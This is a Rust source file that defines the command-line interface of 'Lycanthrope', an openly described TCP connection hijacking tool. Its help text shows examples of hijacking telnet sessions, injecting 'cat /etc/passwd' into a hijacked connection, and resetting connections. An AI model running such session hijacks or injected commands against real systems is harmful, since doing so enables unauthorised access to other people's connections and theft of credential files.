use clap::{ArgAction, Parser};
use std::net::SocketAddr;

/// 🐺 Lycanthrope — Async TCP Connection Hijacker (Rust/C Hybrid)
#[derive(Debug, Parser)]
#[command(
    name = "lycanthrope",
    version,
    about = "TCP connection hijacker with async I/O and TUI",
    after_help = r#"EXAMPLES:
  # 🐺 Lycanthrope Hijack telnet session (interactive)
  sudo lycanthrope eth0 192.168.1.10:37386 192.168.1.20:23

  # Pipe command into hijacked connection
  echo 'cat /etc/passwd' | sudo lycanthrope eth0 10.0.0.5:4444 10.0.0.1:23

  # Reset connection
  sudo lycanthrope -r eth0 10.0.0.5:4444 10.0.0.1:23

  # TUI mode
  sudo lycanthrope --tui eth0 192.168.1.10:0 192.168.1.20:23

  # Use port 0 to match ANY source port

PLATFORMS: Linux, macOS, Windows (Npcap), Android (Termux+root)"#
)]
pub struct Args {
    pub interface: String,

    pub src: SocketAddr,

    pub dst: SocketAddr,

    #[arg(long)]
    pub seq: Option<u32>,

    #[arg(long)]
    pub ack: Option<u32>,

    #[arg(short = 'r', long)]
    pub reset: bool,

    #[arg(short = '0', long)]
    pub send_null: bool,

    #[arg(long)]
    pub tui: bool,

    #[arg(short, long, global = true, action(ArgAction::Count))]
    pub quiet: u8,
}
